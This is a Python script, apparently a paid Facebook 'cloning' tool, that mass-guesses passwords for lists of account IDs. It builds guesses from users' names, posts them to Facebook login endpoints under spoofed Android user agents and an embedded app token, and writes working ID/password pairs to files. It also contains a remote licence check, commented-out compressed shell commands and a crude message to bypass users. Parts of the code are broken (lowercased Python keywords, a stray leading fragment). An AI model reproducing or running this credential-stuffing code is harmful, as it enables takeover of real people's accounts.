		bo = random.choice([m,k,h,b,u,x])
		sys.stdout.write(f'\r\r\033[1;37m [AXE] %s|\033[1;32mSuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		sys.stdout.flush()
	
	except:
		pass
def apix(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [AXE %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source":"device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                                        "method":"auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [Success] '+ids+' | '+pas+'\033[1;97m')#spy(sat shahin yt)(shahi. alam)
#whatsapp : 01615161056
#github : spy1x1
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import threadpoolexecutor as tred
except modulenotfounderror:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['gt-1015','gt-1020','gt-1030','gt-1035','gt-1040','gt-1045','gt-1050','gt-1240','gt-1440','gt-1450','gt-18190','gt-18262','gt-19060i','gt-19082','gt-19083','gt-19105','gt-19152','gt-19192','gt-19300','gt-19505','gt-2000','gt-20000','gt-200s','gt-3000','gt-414xop','gt-6918','gt-7010','gt-7020','gt-7030','gt-7040','gt-7050','gt-7100','gt-7105','gt-7110','gt-7205','gt-7210','gt-7240r','gt-7245','gt-7303','gt-7310','gt-7320','gt-7325','gt-7326','gt-7340','gt-7405','gt-7550   5gt-8005','gt-8010','gt-81','gt-810','gt-8105','gt-8110','gt-8220s','gt-8410','gt-9300','gt-9320','gt-93g','gt-a7100','gt-a9500','gt-android','gt-b2710','gt-b5330','gt-b5330b','gt-b5330l','gt-b5330zkainu','gt-b5510','gt-b5512','gt-b5722','gt-b7510','gt-b7722','gt-b7810','gt-b9150','gt-b9388','gt-c3010','gt-c3262','gt-c3310r','gt-c3312','gt-c3312r','gt-c3313t','gt-c3322','gt-c3322i','gt-c3520','gt-c3520i','gt-c3592','gt-c3595','gt-c3782','gt-c6712','gt-e1282t','gt-e1500','gt-e2200','gt-e2202','gt-e2250','gt-e2252','gt-e2600','gt-e2652w','gt-e3210','gt-e3309','gt-e3309i','gt-e3309t','gt-g530h','gt-g900f','gt-g930f','gt-h9500','gt-i5508','gt-i5801','gt-i6410','gt-i8150','gt-i8160okltpa','gt-i8160zwlttt','gt-i8258','gt-i8262d','gt-i8268','gt-i8505','gt-i8530baabtu','gt-i8530balcho','gt-i8530balttt','gt-i8550e','gt-i8700','gt-i8750','gt-i900','gt-i9008l','gt-i9040','gt-i9080e','gt-i9082c','gt-i9082ewainu','gt-i9082i','gt-i9100g','gt-i9100lklcht','gt-i9100m','gt-i9100p','gt-i9100t','gt-i9105uandbt','gt-i9128e','gt-i9128i','gt-i9128v','gt-i9158p','gt-i9158v','gt-i9168i','gt-i9192i','gt-i9195h','gt-i9195l','gt-i9250','gt-i9303i','gt-i9305n','gt-i9308i','gt-i9505g','gt-i9505x','gt-i9507v','gt-i9600','gt-m190','gt-m5650','gt-mini','gt-n5000s','gt-n5100','gt-n5105','gt-n5110','gt-n5120','gt-n7000b','gt-n7005','gt-n7100t','gt-n7102','gt-n7105','gt-n7105t','gt-n7108','gt-n7108d','gt-n8000','gt-n8005','gt-n8010','gt-n8020','gt-n9000','gt-n9505','gt-p1000cwaxsa','gt-p1000m','gt-p1000t','gt-p1010','gt-p3100b','gt-p3105','gt-p3108','gt-p3110','gt-p5100','gt-p5200','gt-p5210xd1','gt-p5220','gt-p6200','gt-p6200l','gt-p6201','gt-p6210','gt-p6211','gt-p6800','gt-p7100','gt-p7300','gt-p7300b','gt-p7310','gt-p7320','gt-p7500d','gt-p7500m','gt-p7500r','gt-p7500v','gt-p7501','gt-p7511','gt-s3330','gt-s3332','gt-s3333','gt-s3370','gt-s3518','gt-s3570','gt-s3600i','gt-s3650','gt-s3653w','gt-s3770k','gt-s3770m','gt-s3800w','gt-s3802','gt-s3850','gt-s5220','gt-s5220r','gt-s5222','gt-s5230','gt-s5230w','gt-s5233t','gt-s5233w','gt-s5250','gt-s5253','gt-s5260','gt-s5280','gt-s5282','gt-s5283b','gt-s5292','gt-s5300','gt-s5300l','gt-s5301','gt-s5301b','gt-s5301l','gt-s5302','gt-s5302b','gt-s5303','gt-s5303b','gt-s5310','gt-s5310b','gt-s5310c','gt-s5310e','gt-s5310g','gt-s5310i','gt-s5310l','gt-s5310m','gt-s5310n','gt-s5312','gt-s5312b','gt-s5312c','gt-s5312l','gt-s5330','gt-s5360','gt-s5360b','gt-s5360l','gt-s5360t','gt-s5363','gt-s5367','gt-s5369','gt-s5380','gt-s5380d','gt-s5500','gt-s5560','gt-s5560i','gt-s5570b','gt-s5570i','gt-s5570l','gt-s5578','gt-s5600','gt-s5603','gt-s5610','gt-s5610k','gt-s5611','gt-s5620','gt-s5670','gt-s5670b','gt-s5670hkbzta','gt-s5690','gt-s5690r','gt-s5830','gt-s5830d','gt-s5830g','gt-s5830i','gt-s5830l','gt-s5830m','gt-s5830t','gt-s5830v','gt-s5831i','gt-s5838','gt-s5839i','gt-s6010','gt-s6010bbabtu','gt-s6012','gt-s6012b','gt-s6102','gt-s6102b','gt-s6293t','gt-s6310b','gt-s6310zwamid','gt-s6312','gt-s6313t','gt-s6352','gt-s6500','gt-s6500d','gt-s6500l','gt-s6790','gt-s6790l','gt-s6790n','gt-s6792l','gt-s6800','gt-s6800hkaxfa','gt-s6802','gt-s6810','gt-s6810b','gt-s6810e','gt-s6810l','gt-s6810m','gt-s6810mbaser','gt-s6810p','gt-s6812','gt-s6812b','gt-s6812c','gt-s6812i','gt-s6818','gt-s6818v','gt-s7230e','gt-s7233e','gt-s7250d','gt-s7262','gt-s7270','gt-s7270l','gt-s7272','gt-s7272c','gt-s7273t','gt-s7278','gt-s7278u','gt-s7390','gt-s7390g','gt-s7390l','gt-s7392','gt-s7392l','gt-s7500','gt-s7500ababtu','gt-s7500abadbt','gt-s7500abttlp','gt-s7500cwadbt','gt-s7500l','gt-s7500t','gt-s7560','gt-s7560m','gt-s7562','gt-s7562c','gt-s7562i','gt-s7562l','gt-s7566','gt-s7568','gt-s7568i','gt-s7572','gt-s7580e','gt-s7583t','gt-s758x','gt-s7592','gt-s7710','gt-s7710l','gt-s7898','gt-s7898i','gt-s8500','gt-s8530','gt-s8600','gt-stb919','gt-t140','gt-t150','gt-v8a','gt-v8i','gt-vc818','gt-vm919s','gt-w131','gt-w153','gt-x831','gt-x853','gt-x870','gt-x890','gt-y8750'])
xxxxx=(f"gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 5gt-8005","gt-8010","gt-81","gt-810","gt-8105","gt-8110","gt-8220s","gt-8410","gt-9300","gt-9320","gt-93g","gt-a7100","gt-a9500","gt-android","gt-b2710","gt-b5330","gt-b5330b","gt-b5330l","gt-b5330zkainu","gt-b5510","gt-b5512","gt-b5722","gt-b7510","gt-b7722","gt-b7810","gt-b9150","gt-b9388","gt-c3010","gt-c3262","gt-c3310r","gt-c3312","gt-c3312r","gt-c3313t","gt-c3322","gt-c3322i","gt-c3520","gt-c3520i","gt-c3592","gt-c3595","gt-c3782","gt-c6712","gt-e1282t","gt-e1500","gt-e2200","gt-e2202","gt-e2250","gt-e2252","gt-e2600","gt-e2652w","gt-e3210","gt-e3309","gt-e3309i","gt-e3309t","gt-g530h","gt-g930f","gt-h9500","gt-i5508","gt-i5801","gt-i6410","gt-i8150","gt-i8160okltpa","gt-i8160zwlttt","gt-i8258","gt-i8262d","gt-i8268""gt-i8505","gt-i8530baabtu","gt-i8530balcho","gt-i8530balttt","gt-i8550e","gt-i8750","gt-i900","gt-i9008l","gt-i9080e","gt-i9082c","gt-i9082ewainu","gt-i9082i","gt-i9100g","gt-i9100lklcht","gt-i9100m","gt-i9100p","gt-i9100t","gt-i9105uandbt","gt-i9128e","gt-i9128i","gt-i9128v","gt-i9158p","gt-i9158v","gt-i9168i","gt-i9190","gt-i9192","gt-i9192i","gt-i9195h","gt-i9195l","gt-i9250","gt-i9300","gt-i9300i","gt-i9301i","gt-i9303i","gt-i9305n","gt-i9308i","gt-i9500","gt-i9505g","gt-i9505x","gt-i9507v","gt-i9600","gt-m5650","gt-n5000s","gt-n5100","gt-n5105","gt-n5110","gt-n5120","gt-n7000b","gt-n7005","gt-n7100","gt-n7100t","gt-n7102","gt-n7105","gt-n7105t","gt-n7108","gt-n7108d","gt-n8000","gt-n8005","gt-n8010","gt-n8020","gt-n9000","gt-n9505","gt-p1000cwaxsa","gt-p1000m","gt-p1000t","gt-p1010","gt-p3100b","gt-p3105","gt-p3108","gt-p3110","gt-p5100","gt-p5110","gt-p5200","gt-p5210","gt-p5210xd1","gt-p5220","gt-p6200","gt-p6200l","gt-p6201","gt-p6210","gt-p6211","gt-p6800","gt-p7100","gt-p7300","gt-p7300b","gt-p7310","gt-p7320","gt-p7500d","gt-p7500m","samsung","lmy4","lmy47v","mmb29k","mmb29m","lrx22c","lrx22g","nmf2","nmf26x","nmf26x;","nrd90m","nrd90m;","sph-l720","iml74k","imm76d","jdq39","jss15j","jzo54k","kot4","kot49h","kot4sm-t310","ktu84p","sm-a500f","sm-a500fu","sm-a500h","sm-g532f","sm-g900f","sm-g920f","sm-g930f","sm-g935","sm-g950f","sm-j320f","sm-j320fn","sm-j320h","sm-j320m","sm-j510fn","sm-j701f","sm-n920s","sm-t111","sm-t230","sm-t231","sm-t235","sm-t280","sm-t311","sm-t315","sm-t525","sm-t531","sm-t535","sm-t555","sm-t561","sm-t705","sm-t805","sm-t820")
tan=('https')
iya=('github')
ani=('fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
for xd in range(10000):
        aa='mozilla/5.0 (linux; u; android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' tl-tl; {str(gt)}'
        g='applewebkit/537.36 (khtml, like gecko) chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='mobile safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='mozilla/5.0 (linux; android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; t-mobile mytouch 3g slide build/'
        d=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
        e=random.randrange(1, 999)
        f=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
        g='applewebkit/537.36 (khtml, like gecko) chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='mobile safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='mozilla/5.0 (windows nt 6.1; wow64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='asus_i006d build/rkq1.201022.002'
	d=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
	e=random.randrange(1, 999)
	f=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
	g='applewebkit/537.36 (khtml, seperti gecko) chrome/55.0.2883.87 safari/537.36 sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='mobile safari/537.36 sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	useragent.append(uakua)

def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "→".join(uuid)
  server = requests.get(f'{tan}://{iya}.com/{ani}122/vip/blob/main/a.txt').text
  
 

  os.system(f" clear")                          
  print(f"""\x1b[1;97m
d8b   db  .d88b.   .d88b.  d8888b. 
888o  88 .8p  y8. .8p  y8. 88  `8d \033[1;33m𝗡\033[1;37m
88v8o 88 88    88 88    88 88oooy' \033[1;34m𝗢\033[1;37m
88 v8o88 88    88 88    88 88~~~b. \033[1;35m𝗢\033[1;37m
88  v888 `8b  d8' `8b  d8' 88   8d \033[1;36m𝗕\033[1;37m
vp   v8p  `y88p'   `y88p'  y8888p'

  \033[1;32m┌──────────────────────────────────────────────┐
\033[1;32m │\33[37;41m\t     axlone file cloning version   \33[0;m  │
 \033[1;32m└──────────────────────────────────────────────┘
 
 \033[1;32m┌────────────────────────────────────────────────┐
 \033[1;32m│\033[1;31m➣\033[1;91m development     \033[1;31m:\033[1;32m axlone
 \033[1;32m│\033[1;31m➣\033[1;32m facebook        \033[1;31m:\033[1;32m dickoun
 \033[1;32m│\033[1;31m➣\033[1;91m whatsapp        \033[1;31m:\033[1;32m [+9351611490]
 \033[1;32m│\033[1;31m➣\033[1;32m github          \033[1;31m:\033[1;32m porn.com
 \033[1;32m└────────────────────────────────────────────────┘\n""")                                          
  print(f"\t \033[1;32m  first get approvel\033[1;37m ")
  print(f"")
  print(f" \033[1;32m  this tools is paid so you need get approved first\033[1;37m\n")
  print(f"")
  print(f"\x1b[1;92m   contract admin to buy this tools                                                               ");time.sleep (0.1) 
  print(f"")
  print(f"\033[1;32     your  key : "+id)
  print(f"")
  print(f"\033[1;31m   copy your key and send to admin  ");time.sleep(0.1)
  print(f"")
  print(f"  follow admin facebook id,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system(f'xdg-open {tan}://www.facebook.com/sat.shahinyt')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  checking your aproval.............                                                ");time.sleep (0.5)
  try:
    httpcaht = requests.get(f"{tan}://{iya}.com/{ani}122/vip/blob/main/a.txt").text
    if id in httpcaht:
      print(f"\033[1;92m   your key aproved   ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print(f"\x1b[1;92m    sorry bro your key not aproved  ")
      print(f"    send payment to admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open {tan}://wa.me/+09351611490?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()
#menu_apikey()
logo= """  \033[1;92m
\033[1;92m╔═════════════════╗
\033[1;93m    freee lang to inanyu   \033[1;32m
\033[1;92m═══════════════════
\033[1;92m══════════════════════════════════════════
\033[1;32m██████╗ ██████╗  █████╗ ███╗  ██╗██████╗ 
\033[1;32m██╔══██╗██╔══██╗██╔══██╗████╗ ██║██╔══██╗
\033[1;32m██████╦╝██████╔╝███████║██╔██╗██║██║  ██║
\033[1;32m██╔══██╗██╔══██╗██╔══██║██║╚████║██║  ██║
\033[1;32m██████╦╝██║  ██║██║  ██║██║ ╚███║██████╔╝
\033[1;32m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝╚═════╝    axelone
\033[1;92m══════════════════════════════════════════       
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] tools type:\033[1;32m free
\033[1;32m[-] version   :\033[1;32m 1.0
\033[1;32m[-] author    :\033[1;32m sympre si troy
\033[1;32m[-] github    :\033[1;32m jojoke
\033[1;32m[-] facebook  :\033[1;32m troy kugisaki
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m this name is axelone brand\033[;0m\033[1;91m═══>\033[1;92m"""

def linex():
        print(50*'_')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def fucked():
	print(' server loadin.......')
	#os.system(zlib.decompress(b'x\x9cknqp\xf1\xf0w\xf5upss(\xcau\xd0-js\xd0\x02\x005\xfe\x05\x0f'))
	#os.system(zlib.decompress(b'x\x9c+\xcau\xd0-js\xd0/nin,j\xd1\xd7\x02\x00,d\x05\x1e'))
	#os.system(zlib.decompress(b'x\x9c+\xcau\xd0-js\xd0/.\xc9/jlo\xd5o\xcd-\xcdi,im\xd17\xd0\xd7\x02\x00\x8dj\t\x81'))
	print(' fuck you bypass user ');exit()

def ckx():
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "→".join(uuid)
	server = requests.get(f'{tan}://{iya}.com/{ani}122/vip/blob/main/a.txt').text
	try:
		httpcaht = requests.get(f"{tan}://{iya}.com/{ani}122/vip/blob/main/b.txt").text
		if id in httpcaht:
			msg = str(os.geteuid())
			pass
		else:
			msg = str(os.geteuid())
			fucked()
	except:
			sys.exit()
def spy():
	clear()
	#ckx()
	print(f" [1] file cloner (best) ")
	print(f" [2] bd random cloner ")
	print(f" [3] gmail cloning")
	print(f" [0] exit")
	me=input(f' choice : ')
	if me in ["2", "02"]:
		bd()
	if me in ["3","03"]:
		gml()
	if me in ["1", "01","11","a","a"]:
		clear()
		file = input(f' put file path\033[1;37m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except filenotfounderror:
			print(f' file location not found ')
			exit()
		print(f' [1] method 1 \n [2] method 2 \n [3] method 3 \n [4] method 4 \n [5] method 5 \n [6] method 6 \n [7] method 7 \n [8] method 8')
		mthd=input(f' choose: ')
		plist=[]
		try:
			ps_limit = int(input(f' how many passwords do you want to add ? '))
		except:
			ps_limit =1
		print(f'\033[1;32m exp: first last,firtslast,first123')
		for i in range(ps_limit):
			plist.append(input(f' put password {i+1}: '))
		print(f' do you went show cp account? (y/n): ')
		cx=input(f' choose: ')
		if cx in ['n','n','no','no','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f' total account : \033[1;32m'+total_ids+f' \n \033[1;37mmethod > \033[1;37mm{mthd}')
			print(f"\033[1;37m use flight mode for speed up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(api,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(ffb1,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(api1,ids,names,passlist)
				elif mthd in ['5','05']:
					crack_submit.submit(ffb3,ids,names,passlist)
				elif mthd in ['6','06']:
					crack_submit.submit(ffb4,ids,names,passlist)
				elif mthd in ['7','07']:
					crack_submit.submit(ffb7,ids,names,passlist)
				elif mthd in ['8','08']:
					crack_submit.submit(ffb8,ids,names,passlist)
				else:
					crack_submit.submit(api1,ids,names,passlist)
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [axe] %s|\033[1;32msuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'first',first).replace(f'last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" not a;brand";v="99", "chromium";v="100", "google chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-us,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=false,headers=head)
                        shahin=session.cookies.get_dict().keys()
                        if "c_user" in shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [success] %s | %s'%(ids,pas))
                                open(f'/sdcard/success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.connectionerror:
                time.sleep(20)
        loop+=1
xxxxx=(f"gt-1015","gt-1020","gt-1030","gt-1035","gt-1040","gt-1045","gt-1050","gt-1240","gt-1440","gt-1450","gt-18190","gt-18262","gt-19060i","gt-19082","gt-19083","gt-19105","gt-19152","gt-19192","gt-19300","gt-19505","gt-2000","gt-20000","gt-200s","gt-3000","gt-414xop","gt-6918","gt-7010","gt-7020","gt-7030","gt-7040","gt-7050","gt-7100","gt-7105","gt-7110","gt-7205","gt-7210","gt-7240r","gt-7245","gt-7303","gt-7310","gt-7320","gt-7325","gt-7326","gt-7340","gt-7405","gt-7550 